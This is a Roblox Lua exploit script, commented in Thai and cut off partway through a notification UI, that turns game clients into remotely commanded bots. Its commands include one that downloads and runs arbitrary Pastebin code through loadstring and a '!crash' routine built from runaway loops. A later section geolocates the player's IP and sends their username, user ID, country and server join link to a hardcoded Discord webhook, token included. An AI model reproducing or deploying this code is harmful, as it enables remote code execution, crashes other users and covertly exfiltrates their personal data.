  
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
 
local TARGET_NAME = "4Q4II"
local Commands = {}
local jailPart = nil
 
-- ข้อมูลพิกัดและไอเทม
local LOCATIONS = {
    ["vinla"] = Vector3.new(245, 4, 213), ["nuke"] = Vector3.new(478, 3, 395),
    ["lobby"] = Vector3.new(-27, 19, 15), ["jail1"] = Vector3.new(-23, -51, 275),
    ["console"] = Vector3.new(655, -317, 502), ["void"] = Vector3.new(999999, -999999, 999999)
}
local TOOL_LIST = {[1]="PropMaker",[2]="BabyBoy",[3]="BabyGirl",[4]="BabyBottle",[5]="Iphone",[6]="Ipad",[7]="Laptop",[8]="Roses",[9]="Bomb"}
 
-- [[ 🛠 ฟังก์ชันลงทะเบียนคำสั่ง ]]
local function cmd(name, hasTarget, hasData, callback)
    Commands[string.lower(name)] = {
        hasTarget = hasTarget,
        hasData = hasData,
        callback = callback
    }
end
 
-- [[ ระบบเช็คเป้าหมาย ]]
local function checkTarget(t, sender)
    if t == "*" then return true end
    if t == "-" then return (LocalPlayer.Name == TARGET_NAME) end
    if t == "other" then return (LocalPlayer.Name ~= TARGET_NAME) end
    return string.find(string.lower(LocalPlayer.Name), string.lower(t or "")) ~= nil
end
 
-- [[ ลงทะเบียนคำสั่งทั้งหมด ]]
 
cmd("!log", true, false, function()
    -- สร้างข้อความ Lerics_ สุ่มเลข พร้อมเว้นบรรทัดแบบ Selection
    local m = "LERICS" .. "_" .. math.random(111, 3999)
 
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        local c = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
        if c then 
            c:SendAsync(m) 
        end
    else
        -- รองรับระบบแชทเก่า (Legacy Chat)
        local sayEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") and 
                         ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
        if sayEvent then
            sayEvent:FireServer(m, "All")
        end
    end
end)
 
cmd("!praw", true, true, function(dat)
    pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/" .. dat))() end)
end)
 
cmd("!server", true, true, function(mode)
    if mode == "rejoin" then TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer) return end
    local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?limit=100&sortOrder=" .. (mode == "new" and "Desc" or "Asc")
    pcall(function()
        local servers = HttpService:JSONDecode(game:HttpGet(url)).data
        local target = (mode == "small" and servers[#servers]) or (mode == "huge" or mode == "old" or mode == "new" and servers[1]) or servers[math.random(1, #servers)]
        if target and target.id ~= game.JobId then TeleportService:TeleportToPlaceInstance(game.PlaceId, target.id, LocalPlayer) end
    end)
end)
 
cmd("!tpl", true, true, function(dat)
    local p = LOCATIONS[string.lower(dat)]
    if p and LocalPlayer.Character then LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(p) end
end)
 
cmd("!tps", true, true, function(dat)
    local a = string.split(dat, " ")
    if #a >= 3 then LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(tonumber(a[1]), tonumber(a[2]), tonumber(a[3])) end
end)
 
cmd("!tp", true, true, function(dat)
    for _,v in ipairs(Players:GetPlayers()) do 
        if string.find(string.lower(v.Name), string.lower(dat)) and v.Character then
            LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame break
        end
    end
end)
 
cmd("!bring", true, false, function(dat, sender)
    if sender.Character then LocalPlayer.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame end
end)
 
cmd("!gear", true, true, function(dat)
    local tool = tonumber(dat) and TOOL_LIST[tonumber(dat)] or dat
    pcall(function() ReplicatedStorage.RE["1Too1l"]:InvokeServer("PickingTools", tool) end)
end)
 
cmd("!rechar", true, false, function()
    pcall(function() ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("ResetCharacterAppearance"):FireServer() end)
end)
 
cmd("!name", true, true, function(dat)
    pcall(function() ReplicatedStorage.RE["1RPNam1eTex1t"]:FireServer("RolePlayName", dat) end)
end)
 
cmd("!jail", true, false, function()
    local hrp = LocalPlayer.Character.HumanoidRootPart
    if jailPart then jailPart:Destroy() end
    jailPart = Instance.new("Part", workspace)
    jailPart.Size, jailPart.CFrame, jailPart.Transparency, jailPart.Anchored = Vector3.new(6,8,6), hrp.CFrame, 0.7, true
    hrp.Anchored = true
end)
 
cmd("!unjail", true, false, function()
    if jailPart then jailPart:Destroy(); jailPart = nil end
    LocalPlayer.Character.HumanoidRootPart.Anchored = false
end)
 
cmd("!ice", true, false, function()
    for _,v in ipairs(LocalPlayer.Character:GetDescendants()) do 
        if v:IsA("BasePart") then v.Anchored, v.Material, v.Color = true, Enum.Material.Ice, Color3.fromRGB(0,195,255) end 
    end
end)
 
cmd("!unice", true, false, function()
    for _,v in ipairs(LocalPlayer.Character:GetDescendants()) do 
        if v:IsA("BasePart") then v.Anchored, v.Material = false, Enum.Material.Plastic end 
    end
end)
 
cmd("!fire", true, false, function()
    local t = LocalPlayer.Character:FindFirstChild("Torso") or LocalPlayer.Character:FindFirstChild("UpperTorso")
    if t then Instance.new("Fire", t).Name = "CustomFire" end
end)
 
cmd("!unfire", true, false, function()
    for _,v in ipairs(LocalPlayer.Character:GetDescendants()) do if v:IsA("Fire") then v:Destroy() end end
end)
 
cmd("!kill", true, false, function() LocalPlayer.Character.Humanoid.Health = 0 end)
cmd("!explosion", true, false, function() Instance.new("Explosion", workspace).Position = LocalPlayer.Character.HumanoidRootPart.Position end)
 
-- แก้ไขคำสั่ง !kick ให้รองรับเหตุผล
cmd("!kick", true, true, function(dat)
    -- ถ้าไม่ได้ใส่เหตุผลมา ให้ใช้เหตุผลเริ่มต้นว่า "KICKED BY ADMIN"
    local reason = (dat ~= "" and dat ~= " ") and dat or "You Been Kicked For No Reasons :/"
    LocalPlayer:Kick(reason)
end)
 
-- แถม: ปรับคำสั่ง !explosion ให้ใส่ความแรงได้ด้วยถ้าต้องการ (ใช้ Data)
cmd("!explode", true, false, function() 
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local exp = Instance.new("Explosion", workspace)
        exp.Position = LocalPlayer.Character.HumanoidRootPart.Position
    end
end)
 
 
cmd("!vfire", true, false, function()
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
 
    -- อ้างอิง Remote และ ClickDetector ตามที่พี่ให้มา
    local remoteEvent = ReplicatedStorage.RE["1Agenc1y"]
    local poolFolder = workspace:FindFirstChild("WorkspaceCom")
    local clickDetector = poolFolder and poolFolder["001_Hospital"].PoolClick.ClickDetector
 
    -- 1. เก็บตำแหน่งเดิม
    local originalLocation = hrp.CFrame
 
    -- 2. ยิง Event Teleport (ใช้ pcall กัน Error ในกรณีที่บอทบางตัวโหลดไม่ทัน)
    pcall(function()
        firesignal(remoteEvent.OnClientEvent, "TeleportAgencyPool")
    end)
 
    -- 3. วาร์ปไปที่พิกัดเป้าหมาย
    hrp.CFrame = CFrame.new(-348, 4, 99)
    task.wait(0.2)
 
    -- 4. กด ClickDetector ทันที
    if clickDetector then
        if fireclickdetector then
            fireclickdetector(clickDetector)
        else
            -- กรณีรันบน Executor ที่ไม่มี fireclickdetector (พยายามส่งผ่าน Remote ของมัน)
            local r = clickDetector:FindFirstChildOfClass("RemoteEvent") or clickDetector:FindFirstChildOfClass("UnreliableRemoteEvent")
            if r then r:FireServer() end
        end
    end
 
    -- 5. รอจังหวะนิดนึงแล้ววาร์ปกลับที่เดิม
    task.wait(0.55)
    hrp.CFrame = originalLocation
end)
 
cmd("!party", true, false, function()
    -- อ้างอิง Remote
    local remoteEvent = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("PartyInviteMore")
 
    -- สร้าง Table เก็บ User ID ของทุกคนในเซิร์ฟ
    local allPlayerIds = {}
 
    for _, player in ipairs(Players:GetPlayers()) do
        -- เก็บ UserID ทุกคน (รวมถึงตัวเองด้วยตามโค้ดต้นฉบับพี่)
        table.insert(allPlayerIds, player.UserId)
    end
 
    -- ยิงรีโมทส่งคำเชิญหาทุกคนทันที
    pcall(function()
        remoteEvent:FireServer(allPlayerIds)
    end)
end)
 
-- [[ 🏠 คำสั่งให้สิทธิ์บ้าน (!ph [เป้าหมายบอท] [ชื่อคนที่จะได้รับสิทธิ์]) ]]
-- วิธีใช้: !ph - IXCCCL (สั่งให้ตัวเองให้สิทธิ์ IXCCCL)
cmd("!ph", true, true, function(dat, sender)
    local targetName = dat -- ชื่อคนที่จะได้รับสิทธิ์ (เช่น IXCCCL)
    local targetPlayer = Players:FindFirstChild(targetName)
 
    if targetPlayer then
        -- หา Path บ้านโดยใช้ชื่อคนสั่ง + House
        local housePath = workspace:WaitForChild("001_Lots"):FindFirstChild(sender.Name .. "House")
        if housePath then
            local remote = housePath:WaitForChild("HousePickedByPlayer"):WaitForChild("HouseModel"):FindFirstChild("Permissions:AddRoommate")
            if remote then
                remote:FireServer(targetPlayer)
            end
        end
    end
end)
 
-- [[ 🚫 คำสั่งถอนสิทธิ์บ้าน (!unph [เป้าหมายบอท] [ชื่อคนที่จะโดนถอน หรือ all]) ]]
-- วิธีใช้: !unph - IXCCCL หรือ !unph - all
cmd("!unph", true, true, function(dat, sender)
    local housePath = workspace:WaitForChild("001_Lots"):FindFirstChild(sender.Name .. "House")
    if not housePath then return end
 
    local remote = housePath:WaitForChild("HousePickedByPlayer"):WaitForChild("HouseModel"):FindFirstChild("Permissions:RemoveRoommate")
    if not remote then return end
 
    if string.lower(dat) == "all" then
        -- ถ้าสั่ง all ให้ถอนสิทธิ์ทุกคนในเซิร์ฟ
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= sender then -- ไม่ถอนสิทธิ์ตัวเอง (ป้องกัน Error)
                remote:FireServer(p)
            end
        end
    else
        -- ถอนสิทธิ์เฉพาะชื่อที่ระบุ
        local targetPlayer = Players:FindFirstChild(dat)
        if targetPlayer then
            remote:FireServer(targetPlayer)
        end
    end
end)
 
 
 
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
 
local player = Players.LocalPlayer
 
local flySpeed = 100
local flying = true -- [[ ✅ ปรับเป็น true ตามสั่ง ]]
local bodyVelocity, bodyGyro
local flightConnection
local currentFlyGui -- เก็บไว้สั่งลบจาก Bio
 
-- [[ 🛠 ฟังก์ชันการบินต้นฉบับ ]]
local function initialRise(character)
    local riseSpeed = 10
    local startTime = tick()
    local riseTime = 0.1
    while tick() - startTime < riseTime do
        if bodyVelocity then bodyVelocity.Velocity = Vector3.new(0, riseSpeed, 0) end
        RunService.RenderStepped:Wait()
    end
end
 
local function startFlying()
    if not flying then flying = true end
    local character = player.Character or player.CharacterAdded:Wait()
    character.Humanoid.PlatformStand = true
    bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.MaxForce = Vector3.new(100000, 100000, 100000)
    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
    bodyVelocity.Parent = character.HumanoidRootPart
    bodyGyro = Instance.new("BodyGyro")
    bodyGyro.MaxTorque = Vector3.new(100000, 100000, 100000)
    bodyGyro.CFrame = character.HumanoidRootPart.CFrame
    bodyGyro.Parent = character.HumanoidRootPart
    initialRise(character)
    flightConnection = RunService.RenderStepped:Connect(function()
        if flying and character and character:FindFirstChild("Humanoid") and character:FindFirstChild("HumanoidRootPart") then
            local moveDirection = character.Humanoid.MoveDirection * flySpeed
            local camLookVector = workspace.CurrentCamera.CFrame.LookVector
            if moveDirection.Magnitude > 0 then
                if camLookVector.Y > 0.2 then
                    moveDirection = moveDirection + Vector3.new(0, camLookVector.Y * flySpeed, 0)
                elseif camLookVector.Y < -0.2 then
                    moveDirection = moveDirection + Vector3.new(0, camLookVector.Y * flySpeed, 0)
                end
            else
                moveDirection = bodyVelocity.Velocity:Lerp(Vector3.new(0, 0, 0), 0.085)
            end
            bodyVelocity.Velocity = moveDirection
            local tiltAngle = 40
            local tiltFactor = moveDirection.Magnitude / flySpeed
            local tiltDirection = 1
            if workspace.CurrentCamera.CFrame:VectorToObjectSpace(moveDirection).Z < 0 then tiltDirection = -1 end
            local tiltCFrame = CFrame.Angles(math.rad(tiltAngle) * tiltFactor * tiltDirection, 0, 0)
            local targetCFrame = CFrame.new(character.HumanoidRootPart.Position, character.HumanoidRootPart.Position + camLookVector) * tiltCFrame
            bodyGyro.CFrame = bodyGyro.CFrame:Lerp(targetCFrame, 0.2)
        end
    end)
end
 
local function stopFlying()
    if not flying then return end
    flying = false
    local character = player.Character or player.CharacterAdded:Wait()
    if character:FindFirstChild("Humanoid") then character.Humanoid.PlatformStand = false end
    if flightConnection then flightConnection:Disconnect(); flightConnection = nil end
    if bodyVelocity then bodyVelocity:Destroy() end
    if bodyGyro then bodyGyro:Destroy() end
end
 
-- ================= GUI SECTION & COMMANDS =================
 
cmd("!fly", true, true, function(dat)
    local s = tonumber(dat) or 100
    flySpeed = s
 
    if currentFlyGui then currentFlyGui:Destroy() end
 
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "FlyControlPanel"
    screenGui.Parent = CoreGui
    screenGui.ResetOnSpawn = false
    currentFlyGui = screenGui
 
    local panel = Instance.new("Frame")
    panel.Size = UDim2.new(0, 200, 0, 125)
    panel.Position = UDim2.new(0, 967, 0, 378) 
    panel.BackgroundColor3 = Color3.fromRGB(45,45,45)
    panel.BackgroundTransparency = 0.05
    panel.BorderSizePixel = 0
    panel.ClipsDescendants = true
    panel.Parent = screenGui
 
    local dragging, dragStart, startPos
    panel.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = panel.Position
        end
    end)
    panel.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            panel.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    panel.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
    end)
 
    local headerHeight = 30 
    local header = Instance.new("TextLabel")
    header.Size = UDim2.new(1, 0, 0, headerHeight)
    header.BackgroundColor3 = Color3.fromRGB(54, 54, 54)
    header.Text = " FLY"
    header.TextColor3 = Color3.new(1, 1, 1)
    header.BorderSizePixel = 0
    header.Font = Enum.Font.Highway
    header.TextXAlignment = Enum.TextXAlignment.Left
    header.TextSize = 18
    header.Parent = panel
 
    local closeButton = Instance.new("TextButton")
    closeButton.Size = UDim2.new(0, 30, 1, 0)
    closeButton.Position = UDim2.new(1, -30, 0, 0)
    closeButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
    closeButton.BackgroundTransparency = 0.5
    closeButton.Text = "X"
    closeButton.TextColor3 = Color3.new(1, 1, 1)
    closeButton.BorderSizePixel = 0
    closeButton.Font = Enum.Font.SourceSans
    closeButton.TextSize = 18
    closeButton.Parent = header
    closeButton.MouseButton1Click:Connect(function()
        stopFlying()
        screenGui:Destroy()
        currentFlyGui = nil
    end)
 
    local m = Instance.new("TextButton")
    m.Parent = header
    m.Size = UDim2.new(0, 30, 1, 0)
    m.Position = UDim2.new(1, -60, 0, 0)
    m.BackgroundColor3 = Color3.fromRGB(0,0,0)
    m.BorderSizePixel = 0
    m.TextColor3 = Color3.fromRGB(255,255,255)
    m.BackgroundTransparency = 0.5
    m.Text = "-"
 
    local Box = Instance.new("TextLabel")
    Box.Size = UDim2.new(0.9,0,0.25)
    Box.Position = UDim2.new(0.05,0,0.65)
    Box.BackgroundColor3 = Color3.fromRGB(50,50,50)
    Box.TextColor3 = Color3.new(1, 1, 1)
    Box.BorderSizePixel = 0
    Box.Font = Enum.Font.SourceSans
    Box.TextSize = 20
    Box.Text = "ㅤㅤㅤㅤSpeed:"
    Box.Parent = panel
    Box.TextXAlignment = Enum.TextXAlignment.Left
 
    local speedBox = Instance.new("TextBox")
    speedBox.Size = UDim2.new(0.4,0,0.9)
    speedBox.Position = UDim2.new(0.55,0,0.05)
    speedBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
    speedBox.PlaceholderText = "Enter Speed"
    speedBox.Text = " " .. tostring(flySpeed)
    speedBox.TextColor3 = Color3.new(1, 1, 1)
    speedBox.BorderSizePixel = 0
    speedBox.Font = Enum.Font.SourceSans
    speedBox.TextSize = 20
    speedBox.TextXAlignment = Enum.TextXAlignment.Left
    speedBox.ClearTextOnFocus = false
    speedBox.Parent = Box
 
    local flyButton = Instance.new("TextButton")
    flyButton.Size = UDim2.new(0.9,0,0.25)
    flyButton.Position = UDim2.new(0.05, 0, 0.35)
    flyButton.BackgroundColor3 = Color3.fromRGB(54, 54, 54)
    flyButton.Text = "DISABLE" -- เริ่มมาบินเลย
    flyButton.TextColor3 = Color3.new(1, 1, 1)
    flyButton.BorderSizePixel = 0
    flyButton.Font = Enum.Font.Highway
    flyButton.TextSize = 20
    flyButton.Parent = panel
 
    -- Animation Logic (ก๊อปมาครบ)
    local isMinimized = false
    local originalSize = UDim2.new(0, 200, 0, 125)
    local minimizedSize = UDim2.new(0, 200, 0, headerHeight) 
    local tweenDuration = 0.4
 
    m.MouseButton1Click:Connect(function()
        local tweenInfo = TweenInfo.new(tweenDuration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        if isMinimized then
            isMinimized = false
            m.Text = "-"
            Box.Visible = true
            flyButton.Visible = true
            TweenService:Create(panel, tweenInfo, {Size = originalSize}):Play()
        else
            isMinimized = true
            m.Text = "+"
            TweenService:Create(panel, tweenInfo, {Size = minimizedSize}):Play()
            task.delay(tweenDuration, function() if isMinimized then Box.Visible = false flyButton.Visible = false end end)
        end
    end)
 
    flyButton.MouseButton1Click:Connect(function()
        local newSpeed = tonumber(speedBox.Text)
        if newSpeed then flySpeed = newSpeed end
        if flying then
            stopFlying()
            flyButton.Text = "ENABLE"
        else
            startFlying()
            flyButton.Text = "DISABLE"
        end
        speedBox.Text = " " .. tostring(flySpeed)
    end)
 
    startFlying() -- บินทันทีเมื่อสั่ง Cmd
end)
 
-- **!unfly: ปิดแล้วทำลายทิ้ง**
cmd("!unfly", true, false, function()
    stopFlying()
    if currentFlyGui then
        currentFlyGui:Destroy()
        currentFlyGui = nil
    end
end)
 
cmd("!crash", true, true, function(dat)
    local targetName = dat:lower()
    for _, v in pairs(Players:GetPlayers()) do
        if v.Name:lower():sub(1, #targetName) == targetName then
 
            -- [[ ส่วนปลิดชีพเครื่องเป้าหมาย ]]
            task.spawn(function()
                -- 1. สร้างขยะมหาศาลแบบซ้อน Thread (CPU Exploit)
                -- การใช้ while true ซ้อน while true โดยไม่มี task.wait() 
                -- จะทำให้ CPU ติด Infinite Loop จนโปรแกรมหยุดทำงานทันที
                while true do
                    task.spawn(function()
                        while true do
                            -- 2. ยัดค่า CFrame ที่เป็นตัวเลขอนัน-- Engine Roblox จะพยายามคำนวณตำแหน่งนี้แต่พังเพราะตัวเลขเกินขีดจำกัด
                            local p = Instance.new("Part")
                            p.CFrame = CFrame.new(math.huge, math.huge, math.huge)
                            p.Parent = v:FindFirstChild("PlayerGui") or v.Character
 
                            -- 3. ยัด String ขนาด 100MB เข้าไปใน RAM ภายในรอบเดียว
                            local crash = string.rep("💀", 10^7) 
                        end
                    end)
                end
            end)
 
            warn("เหยื่อ: " .. v.Name .. " น่าจะเด้งไปดาวอังคารแล้วพี่")
        end
    end
end)
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
local lastText = ""
 
-- ฟังก์ชันค้นหา Bio แบบ Real-time
local function getBio()
    local leader = Players:FindFirstChild(TARGET_NAME)
    if not leader or not leader.Character then return nil end
 
    local head = leader.Character:FindFirstChild("Head")
    local nameGui = head and head:FindFirstChild("NameGUI")
    return nameGui and nameGui:FindFirstChild("TextBoxBio")
end
 
-- ระบบ Listener แบบอมตะ ไม่ต้องรีตัว
local function startUltraListener()
    print("Ultra Listener Active - Monitoring: " .. TARGET_NAME)
 
    -- ใช้ Heartbeat เช็คทุกเฟรม ป้องกัน Connection หลุดตอนตาย
    RunService.Heartbeat:Connect(function()
        local bio = getBio()
 
        if bio and (bio:IsA("TextBox") or bio:IsA("TextLabel")) then
            local currentText = bio.Text
 
            -- ตรวจสอบว่าข้อความเปลี่ยนและไม่ว่าง
            if currentText ~= lastText and currentText ~= "" and currentText ~= " " then
                lastText = currentText
 
                local args = string.split(currentText, " ")
                local cName = string.lower(args[1] or "")
                local command = Commands[cName]
 
                if command then
                    local leader = Players:FindFirstChild(TARGET_NAME)
 
                    -- Visual Feedback: เปลี่ยนสี Bio เป็นสีแดงเมื่อรับคำสั่ง
                    pcall(function()
                        ReplicatedStorage.RE["1RPNam1eColo1r"]:FireServer("PickingRPBioColor", Color3.new(1, 0, 0))
                    end)
 
                    local targetInput = string.lower(args[2] or "")
                    local dataInput = table.concat(args, " ", 3)
 
                    if not command.hasTarget or checkTarget(targetInput, leader) then
                        task.spawn(function() 
                            pcall(function() command.callback(dataInput, leader) end)
                        end)
                    end
 
                    -- ล้าง Bio และคืนสีเดิม
                    task.delay(0.5, function()
                        pcall(function()
                            if leader == LocalPlayer then
                                ReplicatedStorage.RE["1RPNam1eTex1t"]:FireServer("RolePlayBio", "")
                            end
                            ReplicatedStorage.RE["1RPNam1eColo1r"]:FireServer("PickingRPBioColor", Color3.new(1, 1, 1))
                        end)
                    end)
                end
            elseif currentText == "" or currentText == " " then
                lastText = "" -- Reset เมื่อ Bio ว่างเปล่า
            end
        end
    end)
end
 
-- รันระบบ Listener
task.spawn(startUltraListener)
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
 
-- ข้อมูล Webhook
local webhook_url = "https://discord.com/api/webhooks/1463150444384882763/TdVGr2OWrJ-yuIE-eXcclXxt71Q25-Hy6lAogNrW6U2FTbHreadbXQa2wlhPxFjBy1Gm"
 
-- ID Gamepass (Music Unlocked)
local GAMEPASS_ID = 9066988
 
local function checkGamepass(userId, gamepassId)
    local s, result = pcall(function()
        return MarketplaceService:UserOwnsGamePassAsync(userId, gamepassId)
    end)
    return s and result
end
 
local function getFlagEmoji(countryCode)
    if not countryCode or #countryCode ~= 2 then return "🏳️" end
    local base = 127397
    local code = countryCode:upper()
    local f1 = code:sub(1,1):byte() + base
    local f2 = code:sub(2,2):byte() + base
    return utf8.char(f1) .. utf8.char(f2)
end
 
local geo_info = {}
pcall(function()
    geo_info = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
end)
 
local flag = getFlagEmoji(geo_info.countryCode)
local country_name = geo_info.country or "Unknown"
 
-- ข้อมูลผู้เล่น
local lplr = Players.LocalPlayer
local username = lplr.Name -- ชื่อจริง (@)
local displayName = lplr.DisplayName -- ชื่อเล่น (Name Tag)
local userId = lplr.UserId -- ตัวเลข ID
 
local has_gamepass = checkGamepass(userId, GAMEPASS_ID) and "TRUE" or "FALSE"
local is_public = (game.PrivateServerId == "" and game.PrivateServerOwnerId == 0) and "TRUE" or "FALSE"
local game_name = MarketplaceService:GetProductInfo(game.PlaceId).Name
local click_link = "https://www.roblox.com/games/" .. game.PlaceId .. "/redirect?jobId=" .. game.JobId
 
local data = {
    ["embeds"] = {{
        ["title"] = "🚀 **DELTA EXECUTOR STATUS**",
        ["color"] = (has_gamepass == "TRUE") and 0xFFD700 or 0xFF0000,
        ["fields"] = {
            {["name"] = "🎮 GAME :", ["value"] = "```" .. game_name .. "```", ["inline"] = false},
            {["name"] = "🌐 PUBLIC SERVER :", ["value"] = "**" .. is_public .. "**", ["inline"] = true},
            {["name"] = "🌍 COUNTRY :", ["value"] = flag .. " " .. country_name, ["inline"] = true},
            -- ส่วนที่แก้ไข: ใส่ชื่อเล่น ชื่อจริง และ ID ครบถ้วน
            {["name"] = "👤 USER INFO :", ["value"] = "**" .. displayName .. "** (@" .. username .. ") [" .. userId .. "]", ["inline"] = false},
            {["name"] = "👑 HAS GAMEPASS (Music Unlocked) :", ["value"] = "**" .. has_gamepass .. "**", ["inline"] = false},
            {["name"] = "🔗 JOIN LINK :", ["value"] = "[ CLICK HERE TO JOIN ](" .. click_link .. ")", ["inline"] = false},
            {["name"] = "🆔 JOB ID (COPY BELOW) :", ["value"] = game.JobId, ["inline"] = false}
        },
        ["footer"] = {["text"] = "Hold the Job ID above to copy | " .. os.date("%H:%M:%S")},
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}
 
if request then
    request({
        Url = webhook_url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end
 
 
 
 
-- [[ ELITE V14 - MODERN CUTE STACKER + GEO ]] --
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local localPlayer = Players.LocalPlayer
 
local DB_URL = "https://chx-38791-default-rtdb.firebaseio.com/"
 
-- ================================================= --
--      [ PART 1: YOUR CUSTOM NOTIFICATION UI ]      --
-- ================================================= --
 
-- 1. ค้นหาหรือสร้าง ScreenGui
local sg = CoreGui:FindFirstChild("CuteNotifySystem") or Instance.new("ScreenGui", CoreGui)
sg.Name = "CuteNotifySystem"
sg.IgnoreGuiInset = true
 
-- 2. ค้นหาหรือสร้าง Container
local container = sg:FindFirstChild("MainContainer") or Instance.new("Frame", sg)
if container.Name ~= "MainContainer" then
    container.Name = "MainContainer"
    container.Size = UDim2.new(0, 320, 1, -40)
    container.Position = UDim2.new(1, -340, 0, 20)
    container.BackgroundTransparency = 1
end
 
-- 3. จัดการ Layout
local UIListLayout = container:FindFirstChildOfClass("UIListLayout") or Instance.new("UIListLayout", container)
UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
UIListLayout.Padding = UDim.new(0, 10)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
 
-- ฟังก์ชันทำลายแจ้งเตือนที่เก่าที่สุดเมื่อเกิน Limit
local function handleLimit()
    local children = {}
    for _, child in ipairs(container:GetChildren()) do
        if child:IsA("GuiObject") then table.insert(children, child) end
    end
 
    if #children > 5 then
        table.sort(children, function(a, b) return a.LayoutOrder < b.LayoutOrder end)
        local oldest = children[1]
 
        local closeTw = TweenService:Create(oldest, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
            Size = UDim2.new(1, 0, 0, 0),
            BackgroundTransparency = 1
        })
        closeTw:Play()
        closeTw.Completed:Connect(function() oldest:Destroy() end)
    end
end
 
local count = 0
local function createNotify(title, text)
    count = count + 1
    handleLimit()
 
    local frame = Instance.new("TextButton")
    frame.Name = "Notify_" .. count
    frame.LayoutOrder = count
    frame.Size = UDim2.new(1, 0, 0, 0)
    frame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
    frame.BackgroundTransparency = 1
    frame.BorderSizePixel = 0
    frame.AutoButtonColor = false
    frame.Text = ""
    frame.ClipsDescendants = true
    frame.Parent = container
 
    local corner = Instance.new("UICorner", frame)
    corner.CornerRadius = UDim.new(0, 14)
 
